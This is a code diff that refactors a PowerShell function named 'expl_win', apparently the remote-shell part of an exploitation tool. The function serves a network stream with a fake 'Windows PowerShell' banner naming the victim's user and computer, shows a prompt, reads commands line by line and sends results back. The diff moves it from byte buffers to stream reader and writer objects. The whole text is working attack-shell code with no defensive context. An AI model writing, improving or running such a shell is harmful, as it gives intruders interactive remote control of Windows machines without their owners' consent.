@@ -35,23 +35,22 @@ function expl_win
 
         $stream = $client.GetStream()
         $encoding = [System.Text.Encoding]::UTF8
-        $bufferSize = 8192
-        [byte[]]$bytes = New-Object byte[] $bufferSize
+        $reader = New-Object System.IO.StreamReader($stream, $encoding)
+        $writer = New-Object System.IO.StreamWriter($stream, $encoding)
+        $writer.AutoFlush = $true
 
         $banner = "Windows PowerShell running as user $env:username on $env:computername`n"
         $banner += "Copyright (C) Microsoft Corporation. All rights reserved.`n`n"
-        $sendBytes = $encoding.GetBytes($banner)
-        $stream.Write($sendBytes, 0, $sendBytes.Length)
-        $stream.Flush()
+        $writer.Write($banner)
+        $writer.Flush()
 
         $prompt = "PS $(Get-Location)> "
-        $sendBytes = $encoding.GetBytes($prompt)
-        $stream.Write($sendBytes, 0, $sendBytes.Length)
-        $stream.Flush()
+        $writer.Write($prompt)
+        $writer.Flush()
 
-        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        while (($data = $reader.ReadLine()) -ne $null)
         {
-            $data = $encoding.GetString($bytes, 0, $i).Trim()
+            $data = $data.Trim()
             if ([string]::IsNullOrWhiteSpace($data))
             {
                 $output = ""
@@ -82,9 +81,8 @@ function expl_win
                 $sendback = $output.TrimEnd() + "`n" + $prompt
             }
 
-            $sendBytes = $encoding.GetBytes($sendback)
-            $stream.Write($sendBytes, 0, $sendBytes.Length)
-            $stream.Flush()
+            $writer.Write($sendback)
+            $writer.Flush()
         }
 
         $client.Close()
